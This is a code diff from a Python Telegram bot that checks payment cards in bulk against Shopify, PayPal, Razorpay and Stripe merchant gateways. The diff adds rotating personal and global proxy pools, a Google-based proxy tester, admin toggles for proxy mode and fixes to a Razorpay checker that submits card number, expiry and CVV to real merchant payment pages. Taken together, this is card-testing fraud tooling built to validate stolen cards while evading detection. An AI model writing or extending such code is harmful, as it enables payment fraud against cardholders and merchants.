+        proxy = proxy_manager.get_next_proxy_for_user(user_id)
+        if proxy:
+            print(f"👤 [User Proxy] Using personal proxy for user {user_id}: {mask_proxy(proxy)}")
+            return proxy
     
-    # Fallback to global proxy pool
+    # ============ PRIORITY 2: Global proxy pool (FALLBACK) ============
     if global_proxy_pool.enabled and global_proxy_pool.proxies:
+        # Get a proxy from global pool
         proxy = global_proxy_pool.get_next_proxy()
         if proxy:
-            print(f"🌐 [Global Proxy] Using global proxy: {mask_proxy(proxy)}")
+            print(f"🌐 [Global Proxy] Using global proxy for user {user_id}: {mask_proxy(proxy)}")
             return proxy
         else:
             print(f"⚠️ [Global Proxy] No proxies available in pool")
     
-    print(f"⚠️ [Proxy] No proxy available, using direct connection")
+    # ============ PRIORITY 3: No proxy (direct connection) ============
+    print(f"⚠️ [Proxy] No proxy available for user {user_id}, using direct connection")
+    return None
+
+def get_rotating_proxy_for_user(user_id: int, gateway: str = 'paypal') -> Optional[str]:
+    """Get next proxy in rotation for a specific user"""
+    
+    # ============ PRIORITY 1: User's personal proxies ============
+    if user_id in proxy_manager.user_proxies and proxy_manager.user_proxies[user_id]:
+        available_proxies = proxy_manager.user_proxies[user_id].copy()
+        
+        if available_proxies:
+            rotation_key = f"{user_id}_{gateway}"
+            if not hasattr(proxy_manager, 'user_rotation_indices'):
+                proxy_manager.user_rotation_indices = {}
+            
+            if rotation_key not in proxy_manager.user_rotation_indices:
+                proxy_manager.user_rotation_indices[rotation_key] = 0
+            
+            idx = proxy_manager.user_rotation_indices[rotation_key] % len(available_proxies)
+            selected_raw = available_proxies[idx]
+            proxy_manager.user_rotation_indices[rotation_key] = (idx + 1) % len(available_proxies)
+            
+            formatted = format_proxy_for_paypal(selected_raw)
+            print(f"👤 [User Proxy] Using personal proxy #{idx + 1}: {mask_proxy(selected_raw)}")
+            return formatted or selected_raw
+    
+    # ============ PRIORITY 2: Global proxy pool (FALLBACK) ============
+    if global_proxy_pool.enabled and global_proxy_pool.proxies:
+        proxy = global_proxy_pool.get_next_proxy()
+        if proxy:
+            print(f"🌐 [Global Proxy] Using global proxy for {gateway}: {mask_proxy(proxy)}")
+            formatted = format_proxy_for_paypal(proxy)
+            return formatted or proxy
+    
+    return None
+
+# ============ PROXY WARPER - GLOBAL FALLBACK SYSTEM ============
+
+# ============ PROXY WARPER - GLOBAL ONLY MODE ============
+
+def get_proxy_for_global_gateway(user_id: int, gateway: str = 'default') -> Optional[str]:
+    """
+    Get proxy ONLY from global pool for /aumc and /sh
+    Ignores user's personal proxies completely
+    """
+    print(f"🔍 [GLOBAL ONLY] Getting proxy for user {user_id} (gateway: {gateway})")
+    
+    # ============ ONLY USE GLOBAL PROXY POOL ============
+    if global_proxy_pool.enabled and global_proxy_pool.proxies:
+        # Get a proxy from global pool (with rotation)
+        proxy = global_proxy_pool.get_next_proxy()
+        if proxy:
+            print(f"🌐 [GLOBAL ONLY] Using global proxy: {mask_proxy(proxy)}")
+            return proxy
+        else:
+            print(f"⚠️ [GLOBAL ONLY] Global pool has {len(global_proxy_pool.proxies)} proxies but none available")
+    
+    # No global proxies available
+    print(f"⚠️ [GLOBAL ONLY] No global proxies available for user {user_id}")
     return None
 
 
-# Update the can_use_proxy method to include global pool
-def can_use_proxy(self, user_id: int) -> bool:
-    """Check if user can use proxies (personal or global)"""
-    tier = self.get_tier(user_id)
+def get_proxy_with_fallback(user_id: int, gateway: str = 'default', force_global: bool = False) -> Optional[str]:
+    """
+    PROXY WARPER - Gets proxy based on mode
     
-    # If user can use proxies OR global pool is enabled
-    if self.TIERS[tier]["can_use_proxy"]:
-        return True
+    Args:
+        user_id: The user's Telegram ID
+        gateway: Gateway type (for logging)
+        force_global: Force using global pool even if user has proxies
     
-    # Even if tier doesn't allow personal proxies, they can use global
+    Returns:
+        Proxy string or None
+    """
+    print(f"🔍 [PROXY WARPER] Looking for proxy for user {user_id} (gateway: {gateway})")
+    
+    # ============ GLOBAL ONLY MODE FOR /aumc AND /sh ============
+    if gateway in ['autosopi', 'shopify', 'aumc', 'sh'] and GLOBAL_PROXY_ONLY_MODE:
+        return get_proxy_for_global_gateway(user_id, gateway)
+    
+    # ============ NORMAL MODE FOR OTHER GATEWAYS ============
+    # PRIORITY 1: User's personal proxies
+    if not force_global:
+        if user_id in proxy_manager.user_proxies and proxy_manager.user_proxies[user_id]:
+            user_proxies = proxy_manager.user_proxies[user_id]
+            failed_set = proxy_manager.user_failed_proxies.get(user_id, set())
+            working_proxies = [p for p in user_proxies if p not in failed_set]
+            
+            if working_proxies:
+                if user_id not in proxy_manager.user_proxy_index:
+                    proxy_manager.user_proxy_index[user_id] = 0
+                
+                idx = proxy_manager.user_proxy_index[user_id] % len(working_proxies)
+                selected = working_proxies[idx]
+                proxy_manager.user_proxy_index[user_id] = idx + 1
+                
+                print(f"👤 [PROXY WARPER] Using user's personal proxy: {mask_proxy(selected)}")
+                return selected
+            else:
+                print(f"⚠️ [PROXY WARPER] User has {len(user_proxies)} proxies but all failed")
+    
+    # PRIORITY 2: Global proxy pool (FALLBACK)
     if global_proxy_pool.enabled and global_proxy_pool.proxies:
-        return True
+        proxy = global_proxy_pool.get_next_proxy()
+        if proxy:
+            print(f"🌐 [PROXY WARPER] Using global proxy: {mask_proxy(proxy)}")
+            return proxy
     
-    return False
+    # PRIORITY 3: No proxy (direct connection)
+    print(f"⚠️ [PROXY WARPER] No proxy available, using direct connection")
+    return None
 
 
+def get_proxy_with_fallback_for_api(user_id: int, api_type: str = 'shopify') -> Optional[str]:
+    """
+    Get proxy for specific API type with global fallback
+    
+    Args:
+        user_id: User ID
+        api_type: 'shopify', 'paypal', 'autosopi', etc.
+    
+    Returns:
+        Formatted proxy string or None
+    """
+    raw_proxy = get_proxy_with_fallback(user_id, api_type)
+    
+    if not raw_proxy:
+        return None
+    
+    # Format proxy based on API type
+    if api_type in ['shopify', 'autosopi']:
+        return format_proxy_for_shopify_mass(raw_proxy)
+    elif api_type == 'paypal':
+        return format_proxy_for_paypal(raw_proxy)
+    else:
+        return format_proxy(raw_proxy)
 
+
+# ============ GLOBAL PROXY ROTATION WITH DEAD PROXY REMOVAL ============
+
+async def get_rotating_global_proxy() -> Optional[str]:
+    """
+    Get a rotating proxy from the global pool with automatic dead proxy removal
+    """
+    if not global_proxy_pool.enabled or not global_proxy_pool.proxies:
+        return None
+    
+    # Try up to 3 times to get a working proxy
+    for attempt in range(3):
+        proxy = global_proxy_pool.get_next_proxy()
+        if not proxy:
+            break
+        
+        # Check if proxy is marked as dead
+        if proxy in global_proxy_pool.proxy_stats:
+            stats = global_proxy_pool.proxy_stats[proxy]
+            if stats.get('failures', 0) >= 5 and stats.get('successes', 0) == 0:
+                print(f"🗑️ [GLOBAL] Removing dead proxy: {mask_proxy(proxy)}")
+                global_proxy_pool.remove_proxy(proxy)
+                continue
+        
+        return proxy
+    
+    return None
+
+
+# ============ PROXY STATUS FOR USER ============
+
+async def get_user_proxy_status(user_id: int) -> str:
+    """
+    Get formatted proxy status for a user including global fallback info
+    """
+    # Check user's personal proxies
+    user_proxies = proxy_manager.user_proxies.get(user_id, [])
+    user_failed = proxy_manager.user_failed_proxies.get(user_id, set())
+    working = [p for p in user_proxies if p not in user_failed]
+    
+    # Check global pool
+    global_enabled = global_proxy_pool.enabled
+    global_count = len(global_proxy_pool.proxies)
+    
+    status = f"🔌 <b>Proxy Status</b>\n\n"
+    
+    if user_proxies:
+        status += f"👤 <b>Your Proxies:</b>\n"
+        status += f"   • Total: {len(user_proxies)}\n"
+        status += f"   • Working: {len(working)}\n"
+        status += f"   • Failed: {len(user_failed)}\n"
+    else:
+        status += f"👤 <b>Your Proxies:</b> None\n"
+    
+    status += f"\n🌐 <b>Global Proxy Pool:</b>\n"
+    status += f"   • Status: {'✅ Enabled' if global_enabled else '❌ Disabled'}\n"
+    status += f"   • Total: {global_count}\n"
+    
+    if not user_proxies and global_enabled and global_count > 0:
+        status += f"\n💡 <i>You have no personal proxies. Global proxies will be used automatically.</i>"
+    elif user_proxies and working and global_enabled:
+        status += f"\n💡 <i>Your personal proxies will be used. Global pool is available as fallback.</i>"
+    
+    return status
 
 
 # ============ EZYCOURSE MASS CHECK ============
@@ -31027,9 +30706,10 @@ async def mass_check_stc1(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ============ MASS PROXY ADDING ============
 async def handle_proxy_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle proxy file upload with automatic testing using /aptest"""
+    """Handle proxy file upload with automatic testing - adds to BOTH user and global pools"""
     user_id = update.effective_user.id
     
+    # Check if user can use proxies
     if not user_manager.can_use_proxy(user_id):
         await update.message.reply_text("❌ Your tier doesn't support proxy usage.")
         return
@@ -31044,7 +30724,7 @@ async def handle_proxy_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for line in content.splitlines():
             line = line.strip()
             if line and not line.startswith('#'):
-                # Remove any extra whitespace
+                # Remove any extra whitespace and comments
                 line = line.split('#')[0].strip()
                 if line:
                     raw_proxies.append(line)
@@ -31055,47 +30735,39 @@ async def handle_proxy_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         status_msg = await update.message.reply_text(
             f"📥 Found {len(raw_proxies)} proxies.\n"
-            f"🔍 Validating proxy formats...\n\n"
-            f"⚡ Testing with /pt after validation...",
-            parse_mode=ParseMode.HTML
-        )
-        
-        # First, validate formats and add valid proxies
-        valid_format_proxies = []
-        invalid_format_proxies = []
-        
-        for proxy in raw_proxies:
-            formatted = format_proxy(proxy)
-            if formatted:
-                valid_format_proxies.append(proxy)
-                # Add to user's proxy pool immediately
-                if proxy_manager.add_user_proxy(user_id, proxy):
-                    print(f"✅ Added proxy for user {user_id}: {mask_proxy(proxy)}")
-            else:
-                invalid_format_proxies.append(proxy)
-        
-        # Update status
-        await status_msg.edit_text(
-            f"📥 <b>Proxy File Processed</b>\n\n"
-            f"📊 Total: {len(raw_proxies)}\n"
-            f"✅ Valid Format: {len(valid_format_proxies)}\n"
-            f"❌ Invalid Format: {len(invalid_format_proxies)}\n"
-            f"━━━━━━━━━━━━━━━━━━━\n\n"
-            f"🔄 <b>Auto-testing proxies with /pt...</b>\n"
+            f"🔍 Validating and testing proxies...\n\n"
             f"⏱️ This may take a moment...",
             parse_mode=ParseMode.HTML
         )
         
-        # Auto-run aptest on the newly added proxies
-        if valid_format_proxies:
-            # Store the status message to update later
-            context.user_data['aptest_status_msg'] = status_msg
-            # Run aptest automatically
-            await autosopi_proxy_test_command(update, context)
-        else:
+        # First, validate formats and add valid proxies to both pools
+        valid_proxies = []
+        invalid_proxies = []
+        duplicate_proxies = []
+        
+        # Add to user's pool first
+        for proxy in raw_proxies:
+            # Check if already in user's pool
+            if proxy in proxy_manager.user_proxies.get(user_id, []):
+                duplicate_proxies.append(proxy)
+                continue
+            
+            # Validate format
+            formatted = format_proxy(proxy)
+            if formatted:
+                valid_proxies.append(proxy)
+                # Add to user's personal pool
+                if proxy_manager.add_user_proxy(user_id, proxy):
+                    print(f"✅ Added to user pool: {mask_proxy(proxy)}")
+            else:
+                invalid_proxies.append(proxy)
+        
+        if not valid_proxies:
             await status_msg.edit_text(
                 f"❌ <b>No valid proxies found</b>\n\n"
-                f"All {len(raw_proxies)} proxies had invalid formats.\n\n"
+                f"📊 Total: {len(raw_proxies)}\n"
+                f"❌ Invalid: {len(invalid_proxies)}\n"
+                f"🔁 Duplicate: {len(duplicate_proxies)}\n\n"
                 f"Supported formats:\n"
                 f"• <code>ip:port</code>\n"
                 f"• <code>user:pass@ip:port</code>\n"
@@ -31104,10 +30776,358 @@ async def handle_proxy_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode=ParseMode.HTML,
                 reply_markup=back_menu()
             )
+            return
+        
+        # Update status
+        await status_msg.edit_text(
+            f"📥 <b>Proxy File Processed</b>\n\n"
+            f"📊 Total: {len(raw_proxies)}\n"
+            f"✅ Valid: {len(valid_proxies)}\n"
+            f"❌ Invalid: {len(invalid_proxies)}\n"
+            f"🔁 Duplicate: {len(duplicate_proxies)}\n"
+            f"━━━━━━━━━━━━━━━━━━━\n\n"
+            f"🔄 <b>Testing {len(valid_proxies)} proxies with Google.com...</b>\n"
+            f"⏱️ This may take a moment...",
+            parse_mode=ParseMode.HTML
+        )
+        
+        # ============ TEST PROXIES WITH GOOGLE ============
+        # Test all valid proxies
+        test_results = await test_proxy_batch_with_google(valid_proxies, max_concurrent=15, use_alt=False)
+        
+        # Separate working and failed proxies
+        working_proxies = []
+        failed_proxies = []
+        working_details = []
+        failed_details = []
+        
+        for proxy, is_working, response_time, message_text in test_results:
+            if is_working:
+                working_proxies.append(proxy)
+                working_details.append((proxy, response_time, message_text))
+            else:
+                failed_proxies.append(proxy)
+                failed_details.append((proxy, message_text))
+        
+        # ============ ADD WORKING PROXIES TO GLOBAL POOL ============
+        added_to_global = []
+        already_in_global = []
+        for proxy in working_proxies:
+            if global_proxy_pool.add_proxy(proxy):
+                added_to_global.append(proxy)
+                print(f"🌐 Added to global pool: {mask_proxy(proxy)}")
+            else:
+                already_in_global.append(proxy)
+        
+        # Update user's proxy list to only working ones
+        if working_proxies:
+            proxy_manager.user_proxies[user_id] = working_proxies
+            proxy_manager.user_formatted_proxies[user_id] = [format_proxy(p) for p in working_proxies]
+            proxy_manager._save_user_proxies(user_id)
+            
+            # Clear failed set since we removed bad ones
+            if user_id in proxy_manager.user_failed_proxies:
+                proxy_manager.user_failed_proxies[user_id] = set()
+            
+            # Sync to Autosopi tracker
+            if user_id not in autosopi_proxy_tracker.working_proxies:
+                autosopi_proxy_tracker.working_proxies[user_id] = []
+            else:
+                autosopi_proxy_tracker.working_proxies[user_id] = []
+            
+            for proxy, response_time, msg in working_details:
+                if proxy not in autosopi_proxy_tracker.working_proxies[user_id]:
+                    autosopi_proxy_tracker.working_proxies[user_id].append(proxy)
+                    
+                    autosopi_proxy_tracker.proxy_performance[proxy] = {
+                        'success_count': 1,
+                        'fail_count': 0,
+                        'total_checks': 1,
+                        'avg_response_time': response_time,
+                        'last_response': msg,
+                        'last_used': time.time(),
+                        'is_working': True
+                    }
+            
+            autosopi_proxy_tracker.proxy_rotation_index[user_id] = 0
+        else:
+            # No working proxies - clear everything
+            proxy_manager.user_proxies[user_id] = []
+            proxy_manager.user_formatted_proxies[user_id] = []
+            proxy_manager._save_user_proxies(user_id)
+            if user_id in autosopi_proxy_tracker.working_proxies:
+                autosopi_proxy_tracker.working_proxies[user_id] = []
+        
+        # ============ BUILD FINAL REPORT ============
+        report = f"✅ <b>Proxy File Processing Complete!</b>\n\n"
+        report += f"📊 <b>Results:</b>\n"
+        report += f"   📥 Total proxies: {len(raw_proxies)}\n"
+        report += f"   ✅ Valid format: {len(valid_proxies)}\n"
+        report += f"   ❌ Invalid format: {len(invalid_proxies)}\n"
+        report += f"   🔁 Duplicate: {len(duplicate_proxies)}\n"
+        report += f"   ━━━━━━━━━━━━━━━━━━━\n"
+        report += f"   🌐 Working (Google test): {len(working_proxies)}\n"
+        report += f"   💀 Failed (Google test): {len(failed_proxies)}\n"
+        
+        # Global pool stats
+        global_count = len(global_proxy_pool.proxies)
+        report += f"\n🌐 <b>Global Proxy Pool:</b>\n"
+        report += f"   ✅ Added to global pool: {len(added_to_global)}\n"
+        report += f"   🔁 Already in global pool: {len(already_in_global)}\n"
+        report += f"   📊 Total global proxies: {global_count}\n"
+        
+        if working_proxies:
+            report += f"\n🔌 <b>Your Working Proxies ({len(working_proxies)}) - Sorted by speed:</b>\n"
+            # Sort by speed (fastest first)
+            working_details.sort(key=lambda x: x[1])
+            for i, (proxy, speed, msg) in enumerate(working_details[:15], 1):
+                report += f"  {i}. {mask_proxy(proxy)} ⚡ {speed:.1f}s\n"
+            if len(working_proxies) > 15:
+                report += f"  ... and {len(working_proxies) - 15} more\n"
+            
+            report += f"\n💡 <b>Available for:</b>\n"
+            report += f"   • /aumc - Autosopi mass checks\n"
+            report += f"   • /sh - Shopify checks\n"
+            report += f"   • All users can use global proxies"
+        
+        if failed_proxies:
+            report += f"\n\n❌ <b>Failed Proxies ({len(failed_proxies)}):</b>\n"
+            for proxy, msg in failed_details[:5]:
+                report += f"  • {mask_proxy(proxy)} - {msg[:30]}\n"
+            if len(failed_proxies) > 5:
+                report += f"  ... and {len(failed_proxies) - 5} more\n"
+        
+        await status_msg.edit_text(report, parse_mode=ParseMode.HTML, reply_markup=back_menu())
         
     except Exception as e:
         await update.message.reply_text(f"❌ Error processing file: {str(e)[:100]}")
+        print(f"❌ Proxy file error: {traceback.format_exc()}")
+        
+async def test_proxy_with_google(proxy: str) -> Tuple[bool, float, str]:
+    """
+    Test a single proxy by connecting to google.com
+    Returns: (is_working, response_time, response_message)
+    """
+    if not proxy:
+        return False, 0, "No proxy provided"
+    
+    try:
+        start = time.time()
+        
+        # Format proxy for HTTP requests
+        formatted_proxy = format_proxy(proxy)
+        if not formatted_proxy:
+            return False, 0, "Invalid proxy format"
+        
+        # Test URL (google.com is reliable and fast)
+        test_url = "https://www.google.com"
+        
+        # Create client with proxy configuration at initialization
+        client_kwargs = {
+            'timeout': httpx.Timeout(15.0, connect=8.0, read=10.0),
+            'verify': False,
+            'follow_redirects': True
+        }
+        
+        # Add proxy if provided (correct way for httpx)
+        if formatted_proxy:
+            client_kwargs['proxy'] = formatted_proxy
+        
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            response = await client.get(
+                test_url,
+                headers={
+                    "User-Agent": generate_user_agent(),
+                    "Accept": "text/html,application/xhtml+xml"
+                }
+            )
+        
+        elapsed = time.time() - start
+        
+        # Check if we got a response
+        if response.status_code == 200:
+            # Check if response contains Google content
+            response_text = response.text.lower()
+            if "google" in response_text or "google.com" in response_text:
+                return True, elapsed, "Connected to Google"
+            else:
+                return True, elapsed, f"HTTP {response.status_code} (non-Google response)"
+        elif response.status_code in [301, 302, 307, 308]:
+            # Redirect is fine - proxy works
+            return True, elapsed, f"Redirected (HTTP {response.status_code})"
+        else:
+            return False, elapsed, f"HTTP {response.status_code}"
+            
+    except httpx.TimeoutException:
+        return False, 0, "Connection timeout"
+    except httpx.ConnectError as e:
+        return False, 0, "Connection failed"
+    except httpx.ProxyError as e:
+        return False, 0, "Proxy error"
+    except Exception as e:
+        return False, 0, str(e)[:50]
 
+
+async def test_proxy_with_google_alt(proxy: str) -> Tuple[bool, float, str]:
+    """
+    Alternative test using requests library via thread pool
+    This works better for some proxy formats
+    """
+    if not proxy:
+        return False, 0, "No proxy provided"
+    
+    def sync_test():
+        import requests
+        try:
+            start = time.time()
+            
+            # Format proxy for requests
+            formatted_proxy = format_proxy(proxy)
+            if not formatted_proxy:
+                return False, 0, "Invalid proxy format"
+            
+            # Requests expects proxy dict
+            proxy_dict = {
+                'http': formatted_proxy,
+                'https': formatted_proxy
+            }
+            
+            response = requests.get(
+                'https://www.google.com',
+                proxies=proxy_dict,
+                timeout=15,
+                headers={'User-Agent': generate_user_agent()},
+                verify=False
+            )
+            
+            elapsed = time.time() - start
+            
+            if response.status_code == 200:
+                return True, elapsed, "Connected to Google"
+            elif response.status_code in [301, 302, 307, 308]:
+                return True, elapsed, f"Redirected (HTTP {response.status_code})"
+            else:
+                return False, elapsed, f"HTTP {response.status_code}"
+                
+        except Exception as e:
+            return False, 0, str(e)[:50]
+    
+    # Run sync test in thread pool
+    loop = asyncio.get_event_loop()
+    result = await loop.run_in_executor(thread_pool, sync_test)
+    return result
+
+
+async def test_proxy_batch_with_google(proxies: list, max_concurrent: int = 10, use_alt: bool = False) -> List[Tuple[str, bool, float, str]]:
+    """
+    Test multiple proxies concurrently with google.com
+    Returns list of (proxy, is_working, response_time, message)
+    """
+    results = []
+    semaphore = asyncio.Semaphore(max_concurrent)
+    
+    async def test_single(proxy):
+        async with semaphore:
+            if use_alt:
+                is_working, elapsed, message = await test_proxy_with_google_alt(proxy)
+            else:
+                is_working, elapsed, message = await test_proxy_with_google(proxy)
+            return (proxy, is_working, elapsed, message)
+    
+    tasks = [test_single(proxy) for proxy in proxies]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    
+    # Process results
+    processed_results = []
+    for result in results:
+        if isinstance(result, Exception):
+            continue
+        processed_results.append(result)
+    
+    return processed_results
+
+async def mass_proxy_global_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Mass add and test proxies directly to global pool (admin only)
+    Command: /massglobalproxy <proxy1> <proxy2> ...
+    """
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "🌐 <b>Mass Add Global Proxies</b>\n\n"
+            "Usage: <code>/massglobalproxy &lt;proxy1&gt; &lt;proxy2&gt; ...</code>\n\n"
+            "Example: <code>/massglobalproxy user:pass@ip:port user2:pass2@ip2:port2</code>\n\n"
+            "Proxies will be tested with Google.com before adding.\n"
+            "Working proxies will be added to the global pool.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    proxy_strings = list(context.args)
+    
+    status_msg = await update.message.reply_text(
+        f"🌐 <b>Testing {len(proxy_strings)} proxies...</b>\n\n"
+        f"🔄 Testing each proxy with Google.com...\n"
+        f"⏱️ This may take a moment.",
+        parse_mode=ParseMode.HTML
+    )
+    
+    # Test all proxies
+    test_results = await test_proxy_batch_with_google(proxy_strings, max_concurrent=15, use_alt=False)
+    
+    working_proxies = []
+    failed_proxies = []
+    working_details = []
+    failed_details = []
+    
+    for proxy, is_working, response_time, message_text in test_results:
+        if is_working:
+            working_proxies.append(proxy)
+            working_details.append((proxy, response_time, message_text))
+        else:
+            failed_proxies.append(proxy)
+            failed_details.append((proxy, message_text))
+    
+    # Add working proxies to global pool
+    added_to_global = []
+    already_exist = []
+    
+    for proxy in working_proxies:
+        if global_proxy_pool.add_proxy(proxy):
+            added_to_global.append(proxy)
+        else:
+            already_exist.append(proxy)
+    
+    # Build report
+    report = f"🌐 <b>Global Proxy Mass Add Complete</b>\n\n"
+    report += f"📊 <b>Results:</b>\n"
+    report += f"   📥 Tested: {len(proxy_strings)}\n"
+    report += f"   ✅ Working: {len(working_proxies)}\n"
+    report += f"   ❌ Failed: {len(failed_proxies)}\n"
+    report += f"   ━━━━━━━━━━━━━━━━━━━\n"
+    report += f"   ✅ Added to global pool: {len(added_to_global)}\n"
+    report += f"   🔁 Already in global pool: {len(already_exist)}\n"
+    report += f"   📊 Total global proxies: {len(global_proxy_pool.proxies)}\n"
+    
+    if working_proxies:
+        report += f"\n✅ <b>Working Proxies ({len(working_proxies)}) - Sorted by speed:</b>\n"
+        working_details.sort(key=lambda x: x[1])
+        for i, (proxy, speed, msg) in enumerate(working_details[:15], 1):
+            report += f"  {i}. {mask_proxy(proxy)} ⚡ {speed:.1f}s\n"
+        if len(working_proxies) > 15:
+            report += f"  ... and {len(working_proxies) - 15} more\n"
+    
+    if failed_proxies:
+        report += f"\n❌ <b>Failed Proxies ({len(failed_proxies)}):</b>\n"
+        for proxy, msg in failed_details[:5]:
+            report += f"  • {mask_proxy(proxy)} - {msg[:30]}\n"
+        if len(failed_proxies) > 5:
+            report += f"  ... and {len(failed_proxies) - 5} more\n"
+    
+    await status_msg.edit_text(report, parse_mode=ParseMode.HTML, reply_markup=back_menu())
 # ============ MASS SITE ADDING ============
 async def handle_site_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle site file upload for Autosopi with price checking - USES PROXIES and $10 THRESHOLD"""
@@ -32914,6 +32934,10 @@ async def check_card_shopify_single(card: str, proxy: str = None, site_list: lis
     """
     Check card using Autosopi MAIN API with site rotation and 1-time retry for TOKENIZE_FAIL
     """
+    
+    if not proxy:
+        proxy = get_proxy_with_fallback(user_id, 'shopify')
+        
     # Get all working sites if not provided
     if site_list is None:
         site_list = get_all_working_sites()
@@ -32964,13 +32988,18 @@ async def check_card_shopify_single(card: str, proxy: str = None, site_list: lis
         formatted_card = f"{card_num}|{month}|{year_4digit}|{cvv}"
         
         # Format proxy for TEAMOICX API properly
-        proxy_param = None
-        if proxy:
-            proxy_param = format_proxy_for_teamoicx(proxy)
-            if proxy_param:
-                print(f"🔍 TEAMOICX API using proxy: {proxy_param[:50]}...")
+        proxy_str = None
+        if global_proxy_pool.enabled and global_proxy_pool.proxies:
+            proxy_str = global_proxy_pool.get_next_proxy()
+            if proxy_str:
+                print(f"🌐 [GLOBAL ONLY] Using global proxy: {mask_proxy(proxy_str)}")
             else:
-                print(f"⚠️ Could not format proxy, continuing without proxy")
+                print(f"⚠️ [GLOBAL ONLY] No global proxies available")
+                
+                
+        if retry_count > 0:
+            print(f"🔄 RETRY ATTEMPT #{retry_count}")
+        print(f"{'='*80}")
         
         # Prepare site URL
         if not site_url.startswith(('http://', 'https://')):
@@ -33743,7 +33772,56 @@ async def back_to_buy_callback(update: Update, context: ContextTypes.DEFAULT_TYP
         reply_markup=reply_markup
     )
             
-            
+   
+   
+async def toggle_global_mode_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Toggle global proxy only mode (admin only) - /globalmode"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    global GLOBAL_PROXY_ONLY_MODE
+    GLOBAL_PROXY_ONLY_MODE = not GLOBAL_PROXY_ONLY_MODE
+    
+    status = "ENABLED ✅" if GLOBAL_PROXY_ONLY_MODE else "DISABLED ❌"
+    
+    await update.message.reply_text(
+        f"🔄 <b>Global Proxy Only Mode</b>\n\n"
+        f"Status: {status}\n\n"
+        f"When enabled:\n"
+        f"• /aumc - Uses ONLY global proxies\n"
+        f"• /sh - Uses ONLY global proxies\n"
+        f"• Personal proxies are IGNORED\n\n"
+        f"Other gateways still use personal proxies.",
+        parse_mode=ParseMode.HTML,
+        reply_markup=back_menu()
+    )
+
+
+async def global_mode_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show global proxy mode status - /globalmode_status"""
+    if not await verify_group_access(update, context):
+        return
+    
+    status = "ENABLED ✅" if GLOBAL_PROXY_ONLY_MODE else "DISABLED ❌"
+    
+    msg = f"🌐 <b>Global Proxy Mode Status</b>\n\n"
+    msg += f"Mode: {status}\n\n"
+    
+    if GLOBAL_PROXY_ONLY_MODE:
+        msg += f"📌 <b>Affected Gateways:</b>\n"
+        msg += f"   • /aumc - Global only\n"
+        msg += f"   • /sh - Global only\n\n"
+        msg += f"📊 <b>Global Pool:</b>\n"
+        msg += f"   • Enabled: {'✅' if global_proxy_pool.enabled else '❌'}\n"
+        msg += f"   • Proxies: {len(global_proxy_pool.proxies)}\n"
+    else:
+        msg += f"📌 Personal proxies are used for all gateways.\n"
+        msg += f"Global proxies used as fallback.\n"
+    
+    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
+    
+             
 # ============ STRIPE CHARGER 1 (SC1) - FROM SC1.PY ============
 # Add this to your f13.py
 
@@ -35927,8 +36005,6 @@ async def mass_check_razorpay2_command(update: Update, context: ContextTypes.DEF
     
     await razorpay2_mass_check_logic(update, context, cards, None)
     
-    # ============ RAZORPAY GATEWAY FROM gate2.js ============
-# Add this after your other gateway configurations
 
 import hashlib
 import secrets
@@ -35938,14 +36014,13 @@ from urllib.parse import quote
 
 # Razorpay URLs - rotated round-robin per card
 RAZORPAY_URLS = [
-    'https://pages.razorpay.com/avadale',
-    'https://pages.razorpay.com/Gift2DS',
-    'https://pages.razorpay.com/pl_C0rYjVEXmkqYVC/view',
-    'https://pages.razorpay.com/paytomitzvahLtd',
+    "https://pages.razorpay.com/eventpay",
 ]
+
+
 RAZORPAY_BUILD = '9cb57fdf457e44eac4384e182f925070ff5488d9'
 RAZORPAY_BUILD_V1 = '715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2'
-RAZORPAY_AMOUNT = 1000  # ₹10 in paise
+RAZORPAY_AMOUNT = 10100  # ₹10 in paise
 
 # Global index for URL rotation
 _razorpay_url_index = 0
@@ -36012,12 +36087,11 @@ def _format_razorpay_proxy(raw):
         return f'http://{raw}'
     return None
 
-# ============ RAZORPAY GATEWAY FROM gate2.js (FIXED) ============
+# ============ FIXED RAZORPAY GATEWAY ============
 
 async def check_card_razorpay_gate2(card: str, proxy: str = None, user_id: int = None) -> Dict:
     """
-    Check card using Razorpay gate2 (from gate2.js) - FIXED to capture actual responses
-    Uses direct Razorpay page integration with Chrome 136 profile
+    Check card using Razorpay gate2 - FIXED version
     """
     print(f"\n{'='*80}")
     print(f"💳 [RAZORPAY GATE2] Checking card: {card[:20]}...")
@@ -36048,8 +36122,25 @@ async def check_card_razorpay_gate2(card: str, proxy: str = None, user_id: int =
             }
         
         cc, mm, yy, cvv = parts
-        yy_2 = yy[-2:] if len(yy) == 4 else yy
-        year = int(f'20{yy_2}')
+        
+        # ============ FIX: Convert year to 2-digit ============
+        if len(yy) == 4:
+            yy = yy[2:]  # 2033 -> 33, 2026 -> 26
+        elif len(yy) == 2:
+            yy = yy  # Already 2-digit
+        else:
+            return {
+                "status": "error",
+                "result": "INVALID_YEAR",
+                "message": "Invalid year format. Use: YY or YYYY",
+                "status_display": "⚠️ INVALID YEAR",
+                "status_category": "error"
+            }
+        
+        # Ensure month is 2 digits
+        mm = mm.zfill(2)
+        
+        year = int(f'20{yy}')
         brand = _get_razorpay_brand(cc)
         
         # ============ CHROME 136 PROFILE ============
@@ -36080,10 +36171,11 @@ async def check_card_razorpay_gate2(card: str, proxy: str = None, user_id: int =
         if proxy_url:
             client_kwargs['proxy'] = proxy_url
         
+        start_time = time.time()
+        
         async with httpx.AsyncClient(**client_kwargs) as client:
             # Step 1: Fetch payment page with Chrome 136 headers
             print(f"\n📡 [STEP 1] Fetching payment page: {RAZORPAY_URL}")
-            start_time = time.time()
             
